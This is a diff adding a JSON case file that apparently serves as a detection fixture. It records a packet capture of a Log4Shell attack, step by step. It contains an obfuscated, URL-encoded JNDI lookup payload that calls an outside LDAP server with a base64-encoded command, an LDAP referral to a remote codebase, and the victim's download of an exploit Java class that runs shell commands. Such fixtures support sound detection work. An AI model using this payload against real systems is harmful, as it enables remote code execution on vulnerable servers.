@@ -1,0 +1,87 @@
+{
+  "case_id": "log4shell_ldap_uri_params_ev5_001",
+  "source_pcap": "ldap-uri-params-ev5.pcap",
+  "description": "URL-encoded Log4Shell payload in HTTP URI query parameter, followed by LDAP callback and Java class download.",
+  "streams": [
+    {
+      "stream_key": "172.17.0.1:37628-172.17.0.2:8000-tcp",
+      "protocol": "HTTP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 4,
+          "time": 0.00027,
+          "timestamp_utc": "2021-12-14T16:06:47.860852Z",
+          "position": "http_uri.query.q",
+          "payload": "GET /test?q=%24%7B%24%7Blower%3Aj%7D%24%7Bupper%3An%7D%24%7Blower%3Ad%7D%24%7Bupper%3Ai%7D%3A%24%7Blower%3Al%7Dd%24%7Blower%3Aa%7Dp%3A%2F%2F34.91.73.37%3A1389%2FBasic%2FCommand%2FBase64%2FcGluZyAtYyAxMCAxLjEuMS4x%7D HTTP/1.1\r\nHost: 172.17.0.2:8000\r\nUser-Agent: python-requests/2.25.1\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n",
+          "candidate": "%24%7B%24%7Blower%3Aj%7D%24%7Bupper%3An%7D%24%7Blower%3Ad%7D%24%7Bupper%3Ai%7D%3A%24%7Blower%3Al%7Dd%24%7Blower%3Aa%7Dp%3A%2F%2F34.91.73.37%3A1389%2FBasic%2FCommand%2FBase64%2FcGluZyAtYyAxMCAxLjEuMS4x%7D",
+          "url_decoded_candidate": "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}d${lower:a}p://34.91.73.37:1389/Basic/Command/Base64/cGluZyAtYyAxMCAxLjEuMS4x}",
+          "normalized_preview": "${jndi:ldap://34.91.73.37:1389/Basic/Command/Base64/cGluZyAtYyAxMCAxLjEuMS4x}"
+        },
+        {
+          "no": 183,
+          "time": 0.076643,
+          "timestamp_utc": "2021-12-14T16:06:47.937225Z",
+          "position": "http_response.header",
+          "payload": "HTTP/1.1 200 OK\r\nDate: Tue, 14 Dec 2021 16:06:47 GMT\r\nContent-length: 20\r\n\r\n"
+        },
+        {
+          "no": 185,
+          "time": 0.07674,
+          "timestamp_utc": "2021-12-14T16:06:47.937322Z",
+          "position": "http_response.body",
+          "payload": "This is the response"
+        }
+      ]
+    },
+    {
+      "stream_key": "172.17.0.2:46192-34.91.73.37:1389-tcp",
+      "protocol": "LDAP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 13,
+          "time": 0.005267,
+          "timestamp_utc": "2021-12-14T16:06:47.865849Z",
+          "position": "ldap_search_request.base_dn",
+          "payload": "0o...cM.-Basic/Command/Base64/cGluZyAtYyAxMCAxLjEuMS4x.................objectClass0...0...2.16.840.1.113730.3.4.2"
+        },
+        {
+          "no": 15,
+          "time": 0.008083,
+          "timestamp_utc": "2021-12-14T16:06:47.868665Z",
+          "position": "ldap_search_result.reference",
+          "payload": "0.....d...-Basic/Command/Base64/cGluZyAtYyAxMCAxLjEuMS4x0..0...javaClassName1...foo0*..javaCodeBase1...http://34.91.73.37:8080/0$..objectClass1...javaNamingReference0\"..javaFactory1...ExploitjTcbuJ4P70"
+        }
+      ]
+    },
+    {
+      "stream_key": "172.17.0.2:54276-34.91.73.37:8080-tcp",
+      "protocol": "HTTP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 22,
+          "time": 0.009705,
+          "timestamp_utc": "2021-12-14T16:06:47.870287Z",
+          "position": "http_request.java_class_download",
+          "payload": "GET /ExploitjTcbuJ4P70.class HTTP/1.1\r\nUser-Agent: Java/1.8.0_181\r\nHost: 34.91.73.37:8080\r\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\nConnection: keep-alive\r\n\r\n"
+        },
+        {
+          "no": 24,
+          "time": 0.011644,
+          "timestamp_utc": "2021-12-14T16:06:47.872226Z",
+          "position": "http_response.java_class_header",
+          "payload": "HTTP/1.1 200 OK\r\nDate: Tue, 14 Dec 2021 16:06:47 GMT\r\nContent-length: 1217\r\n\r\n"
+        },
+        {
+          "no": 26,
+          "time": 0.012053,
+          "timestamp_utc": "2021-12-14T16:06:47.872635Z",
+          "position": "java_class_binary.summary",
+          "payload": "Java class binary contains strings: AbstractTranslet, cmd, /bin/sh, -c, java/lang/Runtime, getRuntime, exec"
+        }
+      ]
+    }
+  ]
+}
